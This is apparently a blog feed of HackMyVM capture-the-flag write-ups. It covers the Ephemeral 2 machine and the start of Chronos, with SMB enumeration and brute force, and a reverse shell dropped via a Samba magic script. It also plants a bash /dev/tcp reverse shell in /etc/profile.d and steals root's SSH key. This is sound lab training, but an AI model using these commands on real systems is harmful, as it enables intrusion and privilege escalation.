<span class="p">|</span> <span class="n">ecdsa</span><span class="p">-</span><span class="n">sha2</span><span class="p">-</span><span class="n">nistp256</span> <span class="n">AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBlMZBD50d94mQuFM4n2frVjcsaG1yWdXgHdmKBMNddOg9M67uUbNp8jHiwF</span><span class="p">/</span><span class="n">XQ36yiBGxPXWvvGoxI4oM97c3M</span><span class="p">=</span>
<span class="p">|</span>   <span class="m">256</span> <span class="n">e5</span><span class="p">:</span><span class="m">6</span><span class="n">a</span><span class="p">:</span><span class="m">27</span><span class="p">:</span><span class="m">39</span><span class="p">:</span><span class="n">ed</span><span class="p">:</span><span class="n">a8</span><span class="p">:</span><span class="n">c9</span><span class="p">:</span><span class="m">03</span><span class="p">:</span><span class="m">46</span><span class="p">:</span><span class="n">f2</span><span class="p">:</span><span class="n">a5</span><span class="p">:</span><span class="m">8</span><span class="n">c</span><span class="p">:</span><span class="m">87</span><span class="p">:</span><span class="m">85</span><span class="p">:</span><span class="m">44</span><span class="p">:</span><span class="m">9</span><span class="nf">e</span> <span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
<span class="p">|</span><span class="n">_ssh</span><span class="p">-</span><span class="n">ed25519</span> <span class="n">AAAAC3NzaC1lZDI1NTE5AAAAIBwwUJchIYxvumcFeCwJ4yZnFQPfYLQj3dnAKrIU4j</span><span class="p">+</span><span class="m">1</span>
<span class="m">80</span><span class="p">/</span><span class="n">tcp</span>  <span class="n">open</span>  <span class="n">http</span>        <span class="n">syn</span><span class="p">-</span><span class="n">ack</span> <span class="n">Apache</span> <span class="n">httpd</span> <span class="m">2.4</span><span class="p">.</span><span class="m">41</span> <span class="p">((</span><span class="n">Ubuntu</span><span class="p">))</span>
<span class="p">|</span><span class="n">_http</span><span class="p">-</span><span class="n">server</span><span class="p">-</span><span class="n">header</span><span class="p">:</span> <span class="n">Apache</span><span class="p">/</span><span class="m">2.4</span><span class="p">.</span><span class="m">41</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
<span class="p">|</span> <span class="n">http</span><span class="p">-</span><span class="n">methods</span><span class="p">:</span>
<span class="p">|</span><span class="n">_</span>  <span class="n">Supported</span> <span class="n">Methods</span><span class="p">:</span> <span class="n">POST</span> <span class="n">OPTIONS</span> <span class="n">HEAD</span> <span class="n">GET</span>
<span class="p">|</span><span class="n">_http</span><span class="p">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Apache2</span> <span class="n">Ubuntu</span> <span class="n">Default</span> <span class="n">Page</span><span class="p">:</span> <span class="n">It</span> <span class="n">works</span>
<span class="m">139</span><span class="p">/</span><span class="n">tcp</span> <span class="n">open</span>  <span class="n">netbios</span><span class="p">-</span><span class="n">ssn</span> <span class="n">syn</span><span class="p">-</span><span class="n">ack</span> <span class="n">Samba</span> <span class="n">smbd</span> <span class="m">4.6</span><span class="p">.</span><span class="m">2</span>
<span class="m">445</span><span class="p">/</span><span class="n">tcp</span> <span class="n">open</span>  <span class="n">netbios</span><span class="p">-</span><span class="n">ssn</span> <span class="n">syn</span><span class="p">-</span><span class="n">ack</span> <span class="n">Samba</span> <span class="n">smbd</span> <span class="m">4.6</span><span class="p">.</span><span class="m">2</span>
<span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">OS</span><span class="p">:</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:/</span><span class="n">o</span><span class="p">:</span><span class="n">linux</span><span class="p">:</span><span class="n">linux_kernel</span>

<span class="n">Host</span> <span class="n">script</span> <span class="n">results</span><span class="p">:</span>
<span class="p">|</span><span class="n">_clock</span><span class="p">-</span><span class="n">skew</span><span class="p">:</span> <span class="m">6</span><span class="n">h59m57s</span>
<span class="p">|</span> <span class="n">smb2</span><span class="p">-</span><span class="n">security</span><span class="p">-</span><span class="n">mode</span><span class="p">:</span>
<span class="p">|</span>   <span class="m">3.1</span><span class="p">.</span><span class="m">1</span><span class="p">:</span>
<span class="p">|</span><span class="n">_</span>    <span class="n">Message</span> <span class="n">signing</span> <span class="n">enabled</span> <span class="n">but</span> <span class="n">not</span> <span class="n">required</span>
<span class="p">|</span> <span class="n">p2p</span><span class="p">-</span><span class="n">conficker</span><span class="p">:</span>
<span class="p">|</span>   <span class="n">Checking</span> <span class="k">for</span> <span class="n">Conficker</span><span class="p">.</span><span class="n">C</span> <span class="n">or</span> <span class="n">higher</span><span class="p">...</span>
<span class="p">|</span>   <span class="n">Check</span> <span class="m">1</span> <span class="p">(</span><span class="n">port</span> <span class="m">61913</span><span class="p">/</span><span class="n">tcp</span><span class="p">):</span> <span class="nf">CLEAN</span> <span class="p">(</span><span class="n">Couldn</span><span class="err">'</span><span class="n">t</span> <span class="n">connect</span><span class="p">)</span>
<span class="p">|</span>   <span class="n">Check</span> <span class="m">2</span> <span class="p">(</span><span class="n">port</span> <span class="m">63451</span><span class="p">/</span><span class="n">tcp</span><span class="p">):</span> <span class="nf">CLEAN</span> <span class="p">(</span><span class="n">Couldn</span><span class="err">'</span><span class="n">t</span> <span class="n">connect</span><span class="p">)</span>
<span class="p">|</span>   <span class="n">Check</span> <span class="m">3</span> <span class="p">(</span><span class="n">port</span> <span class="m">53498</span><span class="p">/</span><span class="n">udp</span><span class="p">):</span> <span class="nf">CLEAN</span> <span class="p">(</span><span class="n">Failed</span> <span class="n">to</span> <span class="n">receive</span> <span class="n">data</span><span class="p">)</span>
<span class="p">|</span>   <span class="n">Check</span> <span class="m">4</span> <span class="p">(</span><span class="n">port</span> <span class="m">7279</span><span class="p">/</span><span class="n">udp</span><span class="p">):</span> <span class="nf">CLEAN</span> <span class="p">(</span><span class="n">Failed</span> <span class="n">to</span> <span class="n">receive</span> <span class="n">data</span><span class="p">)</span>
<span class="p">|</span><span class="n">_</span>  <span class="m">0</span><span class="p">/</span><span class="m">4</span> <span class="n">checks</span> <span class="n">are</span> <span class="n">positive</span><span class="p">:</span> <span class="n">Host</span> <span class="k">is</span> <span class="n">CLEAN</span> <span class="n">or</span> <span class="n">ports</span> <span class="n">are</span> <span class="n">blocked</span>
<span class="p">|</span> <span class="n">smb2</span><span class="p">-</span><span class="n">time</span><span class="p">:</span>
<span class="p">|</span>   <span class="n">date</span><span class="p">:</span> <span class="m">2022</span><span class="p">-</span><span class="m">05</span><span class="p">-</span><span class="m">18</span><span class="n">T20</span><span class="p">:</span><span class="m">32</span><span class="p">:</span><span class="m">16</span>
<span class="p">|</span><span class="n">_</span>  <span class="n">start_date</span><span class="p">:</span> <span class="n">N</span><span class="p">/</span><span class="n">A</span>
<span class="p">|</span> <span class="n">nbstat</span><span class="p">:</span> <span class="n">NetBIOS</span> <span class="n">name</span><span class="p">:</span> <span class="n">EPHEMERAL</span><span class="p">,</span> <span class="n">NetBIOS</span> <span class="n">user</span><span class="p">:</span> <span class="p">&lt;</span><span class="n">unknown</span><span class="p">&gt;,</span> <span class="n">NetBIOS</span> <span class="n">MAC</span><span class="p">:</span> <span class="p">&lt;</span><span class="n">unknown</span><span class="p">&gt;</span> <span class="p">(</span><span class="n">unknown</span><span class="p">)</span>
<span class="p">|</span> <span class="n">Names</span><span class="p">:</span>
<span class="p">|</span>   <span class="n">EPHEMERAL</span><span class="p">&lt;</span><span class="m">00</span><span class="p">&gt;</span>        <span class="n">Flags</span><span class="p">:</span> <span class="p">&lt;</span><span class="n">unique</span><span class="p">&gt;&lt;</span><span class="n">active</span><span class="p">&gt;</span>
<span class="p">|</span>   <span class="n">EPHEMERAL</span><span class="p">&lt;</span><span class="m">03</span><span class="p">&gt;</span>        <span class="n">Flags</span><span class="p">:</span> <span class="p">&lt;</span><span class="n">unique</span><span class="p">&gt;&lt;</span><span class="n">active</span><span class="p">&gt;</span>
<span class="p">|</span>   <span class="n">EPHEMERAL</span><span class="p">&lt;</span><span class="m">20</span><span class="p">&gt;</span>        <span class="n">Flags</span><span class="p">:</span> <span class="p">&lt;</span><span class="n">unique</span><span class="p">&gt;&lt;</span><span class="n">active</span><span class="p">&gt;</span>
<span class="p">|</span>   <span class="err">\</span><span class="n">x01</span><span class="err">\</span><span class="n">x02__MSBROWSE__</span><span class="err">\</span><span class="n">x02</span><span class="p">&lt;</span><span class="m">01</span><span class="p">&gt;</span>  <span class="n">Flags</span><span class="p">:</span> <span class="p">&lt;</span><span class="k">group</span><span class="p">&gt;&lt;</span><span class="n">active</span><span class="p">&gt;</span>
<span class="p">|</span>   <span class="n">WORKGROUP</span><span class="p">&lt;</span><span class="m">00</span><span class="p">&gt;</span>        <span class="n">Flags</span><span class="p">:</span> <span class="p">&lt;</span><span class="k">group</span><span class="p">&gt;&lt;</span><span class="n">active</span><span class="p">&gt;</span>
<span class="p">|</span>   <span class="n">WORKGROUP</span><span class="p">&lt;</span><span class="m">1d</span><span class="p">&gt;</span>        <span class="n">Flags</span><span class="p">:</span> <span class="p">&lt;</span><span class="n">unique</span><span class="p">&gt;&lt;</span><span class="n">active</span><span class="p">&gt;</span>
<span class="p">|</span>   <span class="n">WORKGROUP</span><span class="p">&lt;</span><span class="m">1</span><span class="n">e</span><span class="p">&gt;</span>        <span class="n">Flags</span><span class="p">:</span> <span class="p">&lt;</span><span class="k">group</span><span class="p">&gt;&lt;</span><span class="n">active</span><span class="p">&gt;</span>
<span class="p">|</span> <span class="n">Statistics</span><span class="p">:</span>
<span class="p">|</span>   <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>
<span class="p">|</span>   <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>
<span class="p">|</span><span class="n">_</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>

</code></pre></div></div>
<p>kalau kaya gini biasanya saya sudah paham, langsung <em>smbmap</em> atau <em>enum4linux</em> untuk enumerasi lebih lanjut.</p>

<h2 id="--443-smb-enumeration">-&gt; 443: SMB Enumeration</h2>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">---&lt;</span><span class="n">redirected</span><span class="p">&gt;---</span>

<span class="p">=================================(</span> <span class="n">Share</span> <span class="n">Enumeration</span> <span class="k">on</span> <span class="m">192.168</span><span class="p">.</span><span class="m">56.13</span> <span class="p">)=================================</span>

<span class="n">Can</span><span class="err">'</span><span class="n">t</span> <span class="n">load</span> <span class="p">/</span><span class="n">etc</span><span class="p">/</span><span class="n">samba</span><span class="p">/</span><span class="n">smb</span><span class="p">.</span><span class="n">conf</span> <span class="p">-</span> <span class="n">run</span> <span class="n">testparm</span> <span class="n">to</span> <span class="n">debug</span> <span class="n">it</span>

        <span class="n">Sharename</span>       <span class="n">Type</span>      <span class="n">Comment</span>
        <span class="p">---------</span>       <span class="p">----</span>      <span class="p">-------</span>
        <span class="n">print</span><span class="err">$</span>          <span class="n">Disk</span>      <span class="n">Printer</span> <span class="n">Drivers</span>
        <span class="n">SYSADMIN</span>        <span class="n">Disk</span>
        <span class="n">IPC</span><span class="err">$</span>            <span class="n">IPC</span>       <span class="n">IPC</span> <span class="nf">Service</span> <span class="p">(</span><span class="n">ephemeral</span> <span class="nf">server</span> <span class="p">(</span><span class="n">Samba</span><span class="p">,</span> <span class="n">Ubuntu</span><span class="p">))</span>
        <span class="n">Officejet_Pro_8600_CDECA1_</span> <span class="n">Printer</span>
<span class="n">SMB1</span> <span class="n">disabled</span> <span class="p">--</span> <span class="n">no</span> <span class="n">workgroup</span> <span class="n">available</span>

<span class="p">[+]</span> <span class="n">Attempting</span> <span class="n">to</span> <span class="n">map</span> <span class="n">shares</span> <span class="k">on</span> <span class="m">192.168</span><span class="p">.</span><span class="m">56.13</span>

<span class="c1">//192.168.56.13/print$  Mapping: DENIED Listing: N/A Writing: N/A</span>
<span class="c1">//192.168.56.13/SYSADMIN        Mapping: DENIED Listing: N/A Writing: N/A</span>

<span class="p">---&lt;</span><span class="n">redirected</span><span class="p">&gt;---</span>

<span class="p">[+]</span> <span class="n">Enumerating</span> <span class="n">users</span> <span class="k">using</span> <span class="nn">SID</span> <span class="n">S</span><span class="p">-</span><span class="m">1</span><span class="p">-</span><span class="m">22</span><span class="p">-</span><span class="m">1</span> <span class="n">and</span> <span class="n">logon</span> <span class="n">username</span> <span class="err">''</span><span class="p">,</span> <span class="n">password</span> <span class="err">''</span>

<span class="n">S</span><span class="p">-</span><span class="m">1</span><span class="p">-</span><span class="m">22</span><span class="p">-</span><span class="m">1</span><span class="p">-</span><span class="m">1000</span> <span class="n">Unix</span> <span class="n">User</span><span class="err">\</span><span class="nf">randy</span> <span class="p">(</span><span class="n">Local</span> <span class="n">User</span><span class="p">)</span>
<span class="n">S</span><span class="p">-</span><span class="m">1</span><span class="p">-</span><span class="m">22</span><span class="p">-</span><span class="m">1</span><span class="p">-</span><span class="m">1001</span> <span class="n">Unix</span> <span class="n">User</span><span class="err">\</span><span class="nf">ralph</span> <span class="p">(</span><span class="n">Local</span> <span class="n">User</span><span class="p">)</span>

</code></pre></div></div>

<p><img src="https://i.postimg.cc/5tqSHvDm/image.png" alt="lmfao" /></p>

<p>ada 2 local unix user di mesin ini (randy, ralph), dan 2 directory shares yang bisa dijadikan untuk jalan selanjutnya. Tapi keduanya mempunyai status <strong>DENIED</strong> yang artinya jika ingin 
mengakses directory itu harus login ke SMB shellnya. maka dengan begitu saya mencoba untuk <em>brute force</em> agar bisa mengakses SMB ini dan play around.
2 user tadi saya save menjadi text.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via <span class="o">[</span>machines/ephemeral2] â€¹node-â€º  â€¹â€º 
â•°â”€î˜‚ <span class="nb">echo</span> <span class="nt">-e</span> <span class="s1">'randy\nralph'</span> <span class="o">&gt;</span> users.txt
</code></pre></div></div>

<h2 id="--obtaining-the-password">-&gt; Obtaining the password</h2>

<p>Open <em>msfconsole</em> and then use the auxiliary of <em>smb_login</em> as the scanning tool.</p>

<p><img src="https://i.postimg.cc/Wpyx8LfJ/image.png" alt="iaka" /></p>

<p>and then i inserted a run command and hit the enter key</p>

<p><img src="https://i.postimg.cc/jdPwdTpH/image.png" alt="asda" /></p>

<p>waw, okay, dengan begini saya mendapatkan password dari <em>randy</em>, dan password yang dibawahnya itu mungkin salah (spoiler). lalu saya login SMB dan mencoba dengan password yang <em>success</em> itu.
tetap sama aja yang berhasil hanya <em>randy</em>, mungkin <em>metasploit</em> baru ngebug atau apa kurang tau juga saya.</p>

<h2 id="shell-as-randy">shell as randy</h2>

<p><img src="https://i.postimg.cc/ht8dMnMD/image.png" alt="image" /></p>

<p>saya download semua file itu, dan saya letakkan dalam folder baru lagi untuk membuat isi-isinya terorganisir tidak tercampur ke yang lainnya. <br /> 
menariknya pada file <em>smb.conf</em>, saya jadi tertarik untuk mengetahui apa yang dimaksud <em>magic script</em> oleh konfigurasi dibawah ini.</p>
<div class="language-conf highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[<span class="n">SYSADMIN</span>]

<span class="n">path</span> = /<span class="n">home</span>/<span class="n">randy</span>/<span class="n">smbshare</span>
<span class="n">valid</span> <span class="n">users</span> = <span class="n">randy</span>
<span class="n">browsable</span> = <span class="n">yes</span>
<span class="n">writeable</span> = <span class="n">yes</span>
<span class="n">read</span> <span class="n">only</span> = <span class="n">no</span>
<span class="n">magic</span> <span class="n">script</span> = <span class="n">smbscript</span>.<span class="n">elf</span>
<span class="n">guest</span> <span class="n">ok</span> = <span class="n">yes</span>
</code></pre></div></div>
<p>setelah itu, saya jadi teringat bahwasannya ini bisa dimounting ke local karena termasuk <em>CIFS</em>, lalu saya coba lah dengan command.</p>

<p><img src="https://i.postimg.cc/Y97RC89R/image.png" alt="img" /></p>

<p>lalu setelah itu saya berniat untuk membuat rev-shell untuk mencoba dan mencari tahu apakah <em>magic script</em> ini bebas untuk diisi apa aja, karena berbentuk ELF jadi ya executable lah jelas.
dan disambi dengan listening port pake <em>ncat</em>.</p>

<p><img src="https://i.postimg.cc/RFPsF8Ym/image.png" alt="lmfao" /></p>

<p><img src="https://i.postimg.cc/d329CxHD/image.png" alt="lmfao2" /></p>

<h2 id="shell-as-ralph">shell as ralph</h2>

<p>sebelum itu seperti biasa untuk stabilize shell.</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm-color
<span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("bash")'</span>

<span class="c">#---send it to the background ^C-z---</span>
<span class="nv">$ </span><span class="nb">stty</span> <span class="nt">-a</span><span class="p">;</span> <span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>

<span class="nt">---victim</span> revshell---
<span class="nv">$ </span><span class="nb">stty </span>rows 47 cols 112
</code></pre></div></div>
<p><img src="https://i.postimg.cc/YqwqmhZD/image.png" alt="waw" /></p>

<p>itâ€™s time to enumerate more stuff di mesin ini, menggunakan <em>LinPEAS</em> haha.
tapi sebelumnya alangkah sehatnya kalau saya masuk ke sistem menggunakan ssh saja agar tidak terjadi crash pada mounted directory. jadi kalau begitu saya copy ssh <em>private key</em> ke <em>randyâ€™s ssh directory</em></p>

<p><img src="https://i.postimg.cc/dtWpcf2R/image.png" alt="wget" /></p>

<p>lalu, saya masuk lewat ssh agar jalur lebih aman dan lebih stabil hehe.</p>

<p><img src="https://i.postimg.cc/QtrnqZDD/image.png" alt="apapun" /></p>

<p>demi apapun, sepertinya tidak ada gunanya saya tulis metode untuk membuat stable shell, hadeh. Okay, back to the topic.<br />
Ketika saya sudah seleai menjalankan <em>LinPEAS</em> lalu sayapun bergegas melihat output dari hasil scanning si script ini. Waw, betapa menariknya ada cronjob menajalankan script <em>ssh.sh</em> dari user <em>ralph</em>.</p>

<p><img src="https://i.postimg.cc/h4CRKhg7/image.png" alt="cron" /></p>

<p>ketika saya lihat, isi dari script ini ya sama sih intinya sama seperti nama scriptnya.</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>


/usr/bin/ssh <span class="nt">-o</span> <span class="s2">"StrictHostKeyChecking no"</span> ralph@localhost <span class="nt">-i</span> /home/ralph/.ssh/id_rsa
</code></pre></div></div>
<p>lalu saya coba cek lagi apakah ada cara untuk <em>abuse</em> script diatas. dan saya menemukan <em>privilege</em> untuk user <em>randy</em> bisa write pada directory <strong>profile.d</strong>. yang kalau kita telurusi dari <strong>hacktricks</strong> official kira-kira seperti ini dalihnya.</p>

<p><img src="https://i.postimg.cc/ZKKYL1Y6/image.png" alt="imageya" /></p>

<p>yang mana artinya,</p>
<blockquote>
  <p>file pada <strong>/etc/profile</strong> atau file-file pada <strong>/etc/profile.d</strong> adalah script-script yang bisa dieksekusi ketika suatu user menjalankan sebuah shell baru. Oleh karenanya, jika kamu bisa menulis atau memodifikasi diantara file itu jika kau memiliki privilege.</p>
</blockquote>

<p>maka tanpa banyak berpikir, saya membuat rev-shell dan diletakkan dalam <strong>/etc/profile.d</strong>.</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"/bin/bash -i &gt;&amp; /dev/tcp/192.168.56.1/12345 0&gt;&amp;1"</span> <span class="o">&gt;</span> kek.sh 
<span class="nv">$ </span><span class="nb">chmod</span> +x kek.sh
</code></pre></div></div>
<p>lalu listening dengan <strong>ncat</strong>.</p>

<p><img src="https://i.postimg.cc/2yX5WwZs/image.png" alt="ralph" /></p>

<h2 id="rooting-the-system">rooting the system</h2>

<p><img src="https://i.postimg.cc/wjD6xHw8/image.png" alt="root" /></p>

<p>ketika saya lihat isi dari <em>getfile.py</em>. ternyata HEHEHE</p>

<p><img src="https://i.postimg.cc/Zqc43Hkw/image.png" alt="damn" /></p>

<p>tidak ada permission kawand. jadi saya eksekusi aja daripada kelamaan langsung saya listening ke port 9999 menggunakan <strong>nc</strong> dan file path menggunakan <strong>id_rsa</strong> dari root. kalau misal kita dapat respon berarti
<strong>id_rsa</strong> tersedia dalam directory root.</p>

<p><img src="https://i.postimg.cc/kgxvQ1J3/image.png" alt="test" /></p>

<p>lalu saya ketik command seperti dibawah ini</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sed</span> <span class="s1">'1,9d'</span> id_root <span class="o">&gt;</span> id_root.new <span class="c"># untuk menghilangkan header</span>
<span class="nv">$ </span><span class="nb">mv </span>id_root.new id_root
<span class="nv">$ </span><span class="nb">chmod </span>400 id_root <span class="c"># read only</span>
<span class="nv">$ </span>ssh <span class="nt">-i</span> id_root root@localhost
</code></pre></div></div>
<p>setelah itu, read the root flag!</p>

<p><img src="https://i.postimg.cc/4Nrg01Dx/image.png" alt="damnya" /></p>

<h2 id="referensi">Referensi</h2>

<ul>
  <li><a href="https://www.offensive-security.com/metasploit-unleashed/smb-login-check/">https://www.offensive-security.com/metasploit-unleashed/smb-login-check/</a></li>
  <li><a href="https://linoxide.com/howto-mount-smb-filesystem-using-etcfstab/">https://linoxide.com/howto-mount-smb-filesystem-using-etcfstab/</a></li>
  <li><a href="https://cifs.com/">https://cifs.com/</a></li>
  <li><a href="https://nepcodex.com/2021/06/upgrade-to-an-intelligent-reverse-shell/">https://nepcodex.com/2021/06/upgrade-to-an-intelligent-reverse-shell/</a></li>
  <li><a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation#path">https://book.hacktricks.xyz/linux-hardening/privilege-escalation#path</a></li>
</ul>]]></content><author><name></name></author><category term="hackmyvm" /><category term="smb-login-check" /><category term="cifs" /><category term="cronjob" /><category term="profile.d-writable" /><category term="ssh" /><summary type="html"><![CDATA[Enumerasi SMB menggunakan enum4linux untuk mendapatkan user-usernya lalu mulai brute force untuk bisa akses ke CIFS (Common Internet File System) lalu mounting dan replacing reverse shell ke dalam mounted directory yang di dalamnya terdapat script dijalankan secara automasi bernama smbscript.elf. Dan setelahnya boleh disimak lebih dalam lagi mengenai pembahasan mesin Ephemeral seri ke dua dengan difficulty Medium dari HackMyVM. dibuat oleh Proxy. seri pertama malah dua minggu kemudian baru saya garap. setelah blog ini rilis, baru ada kayanya.]]></summary></entry><entry><title type="html">HackMyVM: Chronos</title><link href="http://localhost:4000/hmv-chronos" rel="alternate" type="text/html" title="HackMyVM: Chronos" /><published>2021-09-16T16:03:26+07:00</published><updated>2021-09-16T16:03:26+07:00</updated><id>http://localhost:4000/hmv-chronos</id><content type="html" xml:base="http://localhost:4000/hmv-chronos"><![CDATA[<p>Habis dipusingin sama soal binary exploit di <a href="https://picoctf">picoctf</a> jadi kangen main boot2root di <a href="https://hackmyvm.eu">HackMyVM</a> dan juga kangen nulis writeup di blog, apalagi HMV udah jarang saya tulis. yang kemaren aja machine box easy semua, hehe. Saya juga udah jarang nulis note kalo habis dapet ilmu baru entah karena apa tapi kurang lebih rasa males yang menghantui pikiran saya. Saya juga mikir â€œbuat apa juga nulis di blog kalo di internet banyak note orang, tinggal dibookmark aja kan gampangâ€. Kurang lebih pikiran itu yang merusak segala visi misi saya.</p>

<h2 id="machine-information">Machine Information</h2>

<table>
  <tbody>
    <tr>
      <td><strong>Details</strong></td>
      <td>Â </td>
    </tr>
    <tr>
      <td>Machine Name</td>
      <td><a href="https:https://hackmyvm.eu/machines/machine.php?vm=Chronos">Chronos</a></td>
    </tr>
    <tr>
      <td>Difficulty Level</td>
      <td><span style="color: #B79616; font-weight: bold;">Medium</span></td>
    </tr>
    <tr>
      <td>Machine Released</td>
      <td><strong>7, August 2021</strong></td>
    </tr>
    <tr>
      <td>Date I complete it</td>
      <td><strong>16, September</strong></td>
    </tr>
  </tbody>
</table>

<h2 id="recon">Recon</h2>

<h2 id="finding-ip-target">Finding IP target</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> Currently scanning: 192.168.86.0/16   |   Screen View: Unique Hosts             
                                                                                 
 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 102                 
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 <span class="nt">-----------------------------------------------------------------------------</span>
 192.168.56.100  <span class="c">#################      1      42  PCS Systemtechnik GmbH        </span>
 192.168.56.108  08:00:27:49:f3:fa      1      60  PCS Systemtechnik GmbH   

</code></pre></div></div>
<p>sebenarnya gak usah repot-repot saya sensor sih, itu juga host yang dibuat virtualbox sendiri.</p>

<h2 id="nmap-scanning">Nmap scanning</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 e4:f2:83:a4:38:89:8d:86:a5:e1:31:76:eb:9d:5f:ea <span class="o">(</span>RSA<span class="o">)</span>
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDFF8YjHtqC35Tv6qgLJ0kNRdjbf30IJ3vKLgvfu9i0tKcx3+TpxYz91j2DXQazjyUpfbIV+fQJb5uyl1iaXHcuvLcQ/wx2WzqzYCmvwM0UzChbwlIUxBpCgfx8wRYNJSwGbgPRoHnXLFquLf47q5nugN87esyyMM0UIaMYo3rNspZtB8QsdzZD2m5RqqI45ab8ByrQZbp8PP7XxTUXWT1ulcAABUbWnRR6VJDL72IQy3G8gpDoU95p4feodti3EA97jwbuNq9G+XeLK2BX4Y5SLpqgYazTWw8scw71hPea4r2YvtJNv6aQJBjMTzDfUm1CQ7pc1qN1T+1vujcyzO7J
|   256 41:5a:21:c4:58:f2:2b:e4:8a:2f:31:73:ce:fd:37:ad <span class="o">(</span>ECDSA<span class="o">)</span>
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBO/PvsX6OqdIiLIzv+JlEolWwqi2s/gnJGADk2W0miSvnZNH2CZ/MAz6qxC4tRLsQl1eI2i43+Wd3tw6pyNvmSg<span class="o">=</span>
|   256 9b:34:28:c2:b9:33:4b:37:d5:01:30:6f:87:c4:6b:23 <span class="o">(</span>ED25519<span class="o">)</span>
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGOQB+a1NPS+fokbiT0hLgpNOYdGG/5+ZVsOoCCn0TyO
80/tcp   open  http    syn-ack Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Site doesn<span class="s1">'t have a title (text/html).
8000/tcp open  http    syn-ack Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn'</span>t have a title <span class="o">(</span>text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8<span class="o">)</span><span class="nb">.</span>
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

</code></pre></div></div>
<p>Ports scanned, i got 22 stands for SSH, 80 for http running on Apache, and 8000 running on Node.js Express Framework. belom pernah ketemu seumur hidup nih server-side yang pake framework jsâ€an. walaupun ada port SSH opened, di machine kali ini saya tidak akan menyentuh sama sekali. jelas nyaman pake reverse shell.</p>

<h2 id="website-view-code">Website view-code</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>arin@aoba ~/Desktop/boot2roots/hmv/chronos<span class="nv">$ </span>curl http://192.168.56.108/
</code></pre></div></div>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">##</span> <span class="nx">Ada</span> <span class="nx">sesuatu</span> <span class="nx">dibagian</span> <span class="nx">bawah</span> <span class="err">##</span>

<span class="kd">var</span> <span class="nx">_0x5bdf</span><span class="o">=</span><span class="p">[</span><span class="dl">'</span><span class="s1">150447srWefj</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">70lwLrol</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">1658165LmcNig</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">open</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">1260881JUqdKM</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">10737CrnEEe</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">2SjTdWC</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">readyState</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">responseText</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">1278676qXleJg</span><span 